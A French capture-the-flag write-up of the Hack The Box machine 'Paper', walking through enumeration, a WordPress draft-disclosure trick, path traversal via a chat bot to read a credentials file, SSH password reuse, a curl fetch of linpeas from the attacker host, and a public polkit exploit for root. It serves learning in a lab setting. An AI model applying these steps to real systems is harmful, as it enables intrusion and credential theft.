---
title: "HTB - Paper sans MetaSploit"
date: 2022-03-12
categories: ["hacking", "Guides"]
tags: [HTB]
featuredImage: "/images/2022/03/Paper_Logo.png"
---
## Intro
Aujourd'hui, nous allons nous attaquer à Paper, une box plutôt simple et aussi très fun. Si vous débutez dans le domaine, je vous recommande très fortement d'essayer de vous creuser la tête avant de lire ce guide. Cette box est vraiment fun, et très sympa pour les débutants !

## Cible
[HTB - Paper](https://app.hackthebox.com/machines/Paper)

## Reconnaissance
Petite reconnaissance basique en fonction des logos et autres infos :

* Il s'agit d'un système Linux ;
* ...

Et c'est tout !

## Énumération
Lançons notre scan `nmap`:

```text
sudo nmap -sC -sV -oA scans\$IP_CIBLE
```
```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 15:39 CET
Nmap scan report for $IP_CIBLE
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```
Nous pouvons voir les services classiques pour une box Linux : SSH et un serveur Apache qui tourne sur les ports 80/tcp et 443/tcp (pour le HTTPs).

Sachant qu'il s'agit d'un serveur web, j'aime bien lancer `Gobuster` pour essayer de trouver des chemins cachés :

```text
gobuster dir -u http://$IP_CIBLE -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -o scans/gobuster
```
```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://$IP_CIBLE
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/02 15:42:41 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/cgi-bin/             (Status: 403) [Size: 199]
/manual               (Status: 301) [Size: 236] [--> http://$IP_CIBLE/manual/]
                                                                                  
===============================================================
2022/03/02 15:42:52 Finished
===============================================================
```
Ce scan ne nous révèle pas grand chose... Nous allons donc lancer `Nikto` :

```
nikto -h http://$IP_CIBLE
```

 ```
 - Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          $IP_CIBLE
+ Target Hostname:    $IP_CIBLE
+ Target Port:        80
+ Start Time:         2022-03-02 15:46:14 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8724 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-03-02 15:49:53 (GMT1) (219 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
 ```
A première vue, nous pourrions penser qu'il n'y a rien d'intéressant ici non plus. Pour être honnête, je suis totalement passé à côté pendant un certain temps...

Finalement, il y a la ligne suivante : `Uncommon header 'x-backend-server' found, with contents: office.paper`.

En voyant, cela, j'ai donc décidé de rajouter une entrée dans le fichier `/etc/hosts` faisant pointer l'IP de la box vers le nom d'hôte `office.paper`.

Une fois cela fait, en se rendant sur l'URL : `http://office.paper`, nous découvrons un nouveau site tournant sous `Wordpress` :

![Wordpress caché](/images/2022/03/Paper_WP.png)

Qui dit Wordpress, dit WPScan, c'est parti :

```
wpscan --url http://office/paper
```

```
         __          _______   _____                                                                                                                                                                              
         \ \        / /  __ \ / ____|                                                                                                                                                                             
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                                            
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                                                                                                                                             
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                                            
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                                            
                                                                                                                                                                                                                  
         WordPress Security Scanner by the WPScan Team                                                                                                                                                            
                         Version 3.8.17                                                                                                                                                                           
       Sponsored by Automattic - https://automattic.com/                                                                                                                                                          
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                                                            
_______________________________________________________________                                                                                                                                                   
                                                                                                                                                                                                                  
[i] It seems like you have not updated the database for some time.                                                                                                                                                
[?] Do you want to update now? [Y]es [N]o, default: [N]Y                                                                                                                                                          
[i] Updating the Database ...                                                                                                                                                                                     
[i] Update completed.                                                                                                                                                                                             
                                                                                                                                                                                                                  
[+] URL: http://office.paper/ [$IP_CIBLE]                                                                                                                                                                     
[+] Started: Thu Mar  3 14:20:45 2022                                                                                                                                                                             
                                                                                                                                                                                                                  
Interesting Finding(s):                                                                                                                                                                                           
                                                                                                                                                                                                                  
[+] Headers                                                                                                                                                                                                        | Interesting Entries:                                                                                                                                                                                          
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9                                      
 |  - X-Powered-By: PHP/7.2.24                                                                           
 |  - X-Backend-Server: office.paper                                                                     
 | Found By: Headers (Passive Detection)                                                                 
 | Confidence: 100%                                                                                      
                                                                                                                                                                                                                 
[+] WordPress readme found: http://office.paper/readme.html                                              
 | Found By: Direct Access (Aggressive Detection)                                                        
 | Confidence: 100%                                                                                                                                                                                               
                                                                                                         
[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).                               
 | Found By: Rss Generator (Passive Detection)                                                                                                                                                                   
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>                                                                                                                 
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>                                                                                                        
                                                    
[+] WordPress theme in use: construction-techup                                                                                                                                                                  
 | Location: http://office.paper/wp-content/themes/construction-techup/                                  
 | Last Updated: 2021-07-17T00:00:00.000Z                                                                                                                                                                        
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt                                                                                                                                  
 | [!] The version is out of date, the latest version is 1.4                                                                                                                                                     
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1                
 | Style Name: Construction Techup                                                                                                                                                                               
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...                                                                                          
 | Author: wptexture                
 | Author URI: https://testerwp.com/                                                                     
 |                                                                                                                                                                                                               
 | Found By: Css Style In Homepage (Passive Detection)          
  |                                                                                                       
 | Version: 1.1 (80% confidence)                                                                         
 | Found By: Style (Passive Detection)                                                                   
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1' 
                                                                                                                                                                                                                 
[+] Enumerating All Plugins (via Passive Methods)                                                        
                                                                                                         
[i] No plugins Found.                                                                                                                                                                                             
                                                                                                         
[+] Enumerating Config Backups (via Passive and Aggressive Methods)                                      
 Checking Config Backups - Time: 00:00:00 <===================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00
                                                                                                                                                                                                                 
[i] No Config Backups Found.                                                                                                                                                                                      
                                                    
[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                                                                               
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register    
                                                                                                                                                                                                                 
[+] Finished: Thu Mar  3 14:20:50 2022                                                                                                                                                                           
[+] Requests Done: 180                                                                                                                                                                                           
[+] Cached Requests: 5                                                                                   
[+] Data Sent: 43.575 KB                                                                                                                                                                                         
[+] Data Received: 17.864 MB                                                                                                                                                                                      
[+] Memory used: 229.191 MB         
[+] Elapsed time: 00:00:04
```
Il s'agit d'un vieux `Wordpress`, version 5.2.3 ! Un tour rapide sur [exploit-db](https://www.exploit-db.com/exploits/47690) nous apprend qu'il est vulnérable. La faille en question permet d'accéder aux brouillons et autre contenu non publié... Sur le Wordpress que nous venons de découvrir, il y a justement des commentaires laissant penser que l'admin du site à noté des infos dans les brouillons...

## Exploitation

L'exploit recommande d'utiliser l'URL suivante :

` http://office.paper/?static=1&order=asc`

Cela ne fonctionne pas...

Essayons donc, simplement de changer l'URL en remplaçant le dernier mot clef par son contraire :

`http://office.paper/?static=1&order=desc`

Bingo, cela fonctionne :

![Paper Wordpress brouillons](/images/2022/03/Paper_Drafts.png)

Nous découvrons une nouvelle URL "secrète", avec un nouveau nom de domaine : `chat.office.paper`. Nous le rajoutons donc dans notre fichier `/etc/hosts` afin de pouvoir y accéder.

Une fois cela fait, nous naviguons vers cette URL et nous découvrons, un chat, `Rocket Chat`. Il est possible de créer un compte, faisons le ! 

Une fois le compte créé, nous avons accès au chat et à l'historique des messages. Après un peu de lecture, nous découvrons qu'il existe un bot capable de lister et obtenir des documents et fichiers. Allons lui parler !

Nous remarquons rapidement qu'il est assez simple de naviguer dans les fichiers avec la commande `recyclops list`, et surtout, nous pouvons sortir du dossier actuel avec `recyclops list ../`. Ce qui liste le contenu de la `home` de l'utilisateur. Au passage, nous voyons aussi son nom : `Dwight`. Malheureusement, impossible d'obtenir le `user.txt`, ni des fichiers systèmes intéressants.

Cependant, le dossier `/home/dwight` contient un script `bot_restart.sh` qui pointe lui-même vers un autre script dans lequel est appelé un fichier `.env`. Grâce à la commande : `recyclops file ../hubot/.env` nous pouvons lire le contenu de ce fichier qui contient un mot de passe !!


![Paper Rocket Creds](/images/2022/03/Paper_Creds.png)

L'utilisateur n'est pas présent sur le système, il s'agit probablement de l'admin du chat. Essayons tout de même le MDP trouvé avec l'utilisateur `dwight` via `SSH`.

### Obtenir un premier shell

Bingo ! Un bon gros cas de réutilisation de mot de passe ! `Dwight` et `Recyclops` partagent le même MDP. Nous sommes donc sur le machine, en `SSH` ! C'est à dire un super shell, bien stable et facile à relancer en cas de besoin.

Obtenir le `flag user` est donc un jeu d'enfant, via la commande `cat` :

![Paper User Flag](/images/2022/03/Paper_User_Flag.png)


### PrivEsc

Désormais, le `PrivEsc` ! Nous avons un accès utilisateur, mais nous allons chercher à augmenter nos droits afin de devenir `root` et ainsi avoir le contrôle total de la machine.

Pour ce faire, j'aime lancer un scan via [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) (WinPeas sous Windows).

Sur toutes les machines `HTB`, l'accès vers internet et coupé. Il faut donc télécharger la dernière version du script sur notre machine "attaquante" et ensuite l'envoyer depuis notre machine vers notre cible. Puisque nous avons un accès `SSH`, nous pouvons simplement l'envoyer via `SCP`, mais je préfère une méthode plus universelle via un module `Python`.

Je vais donc vous montrer comment procéder :

1. Sur notre machine qui "attaque", il faut se placer dans le dossier contenant le script `linpeas.sh` puis lancer la commande suivante : `python3 -m http.server`.
2. Sur la "cible", il faut récupérer le script : `curl -O http://$IP_ATTAQUANT:8000/linpeas.sh`.

Une fois le script téléchargé, nous l'éxécutons. Rapidement, Linpeas détecte une vulnérabilité du côté de `sudo` :

![Paper Linpeas](/images/2022/03/Paper_Sudo_CVE.png)

Une recherche rapide sur [DDG](https://duckduckgo.com/?q=CVE-2021-3560+exploit+github&t=ffab&ia=web), nous amène vers un [dépôt Github prometteur](https://github.com/Almorabea/Polkit-exploit).

Même procédure que pour le script `linpeas.sh`, nous allons récupérer le fichier `CVE-2021-3560.py` sur notre cible et l'exécuter.

__NB : avant d'exécuter un script, quelque il soit, il est toujours très important de le lire et d'essayer de le comprendre ! Vous ne voulez surtout pas exécuter un script qui compromettrait votre machine.__

Après quelques secondes, le script nous donne un accès `root` :

![Paper Root](/images/2022/03/Paper_Root.png)

Et nous récupérons enfin le `flag root` :

![Paper Root Flag](/images/2022/03/Paper_Root_Flag.png)

## Outro

Cette box était plutôt simple, une très bonne box pour reprendre après plusieurs mois d'absence. Elle était aussi assez fun : le header "caché" était très bien trouvé et m'a perdre un temps certain ! Ensuite, le bot du chat était très original et m'a bien amusé ! Bref, une super box que je recommande fortement aux débutants.